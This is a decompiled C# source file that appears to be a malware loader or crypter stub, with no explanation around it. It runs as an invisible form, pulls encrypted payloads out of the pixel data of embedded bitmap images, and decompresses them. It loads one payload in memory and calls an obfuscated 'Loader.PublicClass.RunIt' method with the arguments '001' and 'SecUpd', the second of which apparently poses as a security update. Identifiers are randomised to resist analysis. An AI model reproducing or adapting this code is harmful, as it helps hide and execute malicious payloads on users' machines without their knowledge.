using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public class nnPYkMgLjCbCNHZIfPZf : Form
{
	private void method_0()
	{
		((Control)this).SuspendLayout();
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		Size clientSize = new Size(20, 20);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Visible(false);
		((Form)this).set_Opacity(0.0);
		((Control)this).Hide();
		((Control)this).ResumeLayout(false);
	}

	public nnPYkMgLjCbCNHZIfPZf()
	{
		method_0();
		bnETaclJEhjQWpxmSOONSDKRh();
	}

	public void bnETaclJEhjQWpxmSOONSDKRh()
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		ResourceManager resourceManager = new ResourceManager("sebUpmEd6", Assembly.GetExecutingAssembly());
		Bitmap nHZIfPZfbnETaclJEhjQWpxmS = (Bitmap)resourceManager.GetObject("RzJf2QJ6i");
		ResourceManager resourceManager2 = new ResourceManager("E8NRi79LX", Assembly.GetExecutingAssembly());
		Bitmap nHZIfPZfbnETaclJEhjQWpxmS2 = (Bitmap)resourceManager2.GetObject("strxfXg");
		byte[] array = EGaDIWSBOnnPYkMgLjCbC(nHZIfPZfbnETaclJEhjQWpxmS);
		byte[] rawAssembly = EGaDIWSBOnnPYkMgLjCbC(nHZIfPZfbnETaclJEhjQWpxmS2);
		Assembly assembly = Assembly.Load(rawAssembly);
		object objectValue = RuntimeHelpers.GetObjectValue(assembly.CreateInstance(aclJEhjQWpxmSOONSDKRh("47|123|158|144|147|148|161|93|127|164|145|155|152|146|114|155|144|162|162|")));
		objectValue.GetType().InvokeMember(aclJEhjQWpxmSOONSDKRh("75|157|192|185|148|191|"), BindingFlags.InvokeMethod, null, RuntimeHelpers.GetObjectValue(objectValue), new object[4] { array, true, "001", "SecUpd" });
	}

	public byte[] EGaDIWSBOnnPYkMgLjCbC(Bitmap NHZIfPZfbnETaclJEhjQWpxmS)
	{
		List<byte> list = new List<byte>();
		checked
		{
			int num = ((Image)NHZIfPZfbnETaclJEhjQWpxmS).get_Width() - 1;
			for (int i = 0; i <= num; i++)
			{
				int num2 = ((Image)NHZIfPZfbnETaclJEhjQWpxmS).get_Height() - 1;
				for (int j = 0; j <= num2; j++)
				{
					Color pixel = NHZIfPZfbnETaclJEhjQWpxmS.GetPixel(i, j);
					if (pixel != Color.FromArgb(0, 0, 0, 0))
					{
						list.Add(pixel.R);
						list.Add(pixel.G);
						list.Add(pixel.B);
					}
				}
			}
			return FRfNeQUuigarpMhGMIUXmIJScXBQ(list.ToArray());
		}
	}

	public byte[] FRfNeQUuigarpMhGMIUXmIJScXBQ(byte[] iDWQGluvtyjcjObaqtwoOcVGnpKm)
	{
		checked
		{
			using MemoryStream memoryStream = new MemoryStream(iDWQGluvtyjcjObaqtwoOcVGnpKm);
			using (GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress))
			{
				int num = 0;
				int num2;
				do
				{
					iDWQGluvtyjcjObaqtwoOcVGnpKm = (byte[])Utils.CopyArray((Array)iDWQGluvtyjcjObaqtwoOcVGnpKm, (Array)new byte[num + 1024 - 1 + 1]);
					num2 = gZipStream.Read(iDWQGluvtyjcjObaqtwoOcVGnpKm, num, 1024);
					num += num2;
				}
				while (num2 >= 1024);
				iDWQGluvtyjcjObaqtwoOcVGnpKm = (byte[])Utils.CopyArray((Array)iDWQGluvtyjcjObaqtwoOcVGnpKm, (Array)new byte[num - 1 + 1]);
				gZipStream.Close();
			}
			memoryStream.Close();
			return iDWQGluvtyjcjObaqtwoOcVGnpKm;
		}
	}

	public string aclJEhjQWpxmSOONSDKRh(string IHXNQIgKomUJdUKYiRRE)
	{
		string text = null;
		string[] array = IHXNQIgKomUJdUKYiRRE.Split(new char[1] { '|' });
		string[] array2 = array;
		foreach (string text2 in array2)
		{
			try
			{
				text += Conversions.ToString(Strings.Chr(checked((int)Math.Round(Conversions.ToDouble(text2) - Conversions.ToDouble(array[0])))));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		return text.Remove(0, 1);
	}
}
